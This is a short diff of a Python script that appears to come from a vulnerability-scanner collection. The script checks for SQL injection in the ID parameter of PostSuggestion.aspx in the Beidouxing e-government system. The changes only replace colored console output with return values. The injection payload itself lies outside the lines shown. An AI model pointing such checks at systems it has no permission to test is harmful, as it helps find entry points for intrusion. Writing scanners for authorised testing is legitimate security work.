@@ -8,8 +8,8 @@ description: /sssweb/SuggestionCollection/PostSuggestion.aspx ID参数存在SQL�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class star_PostSuggestion_sqli_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class star_PostSuggestion_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.status_code==500 and r"IIIMicrosoft" in req.text:
-                cprint("[+]存在北斗星政务PostSuggestion.aspx SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在北斗星政务PostSuggestion.aspx SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = star_PostSuggestion_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
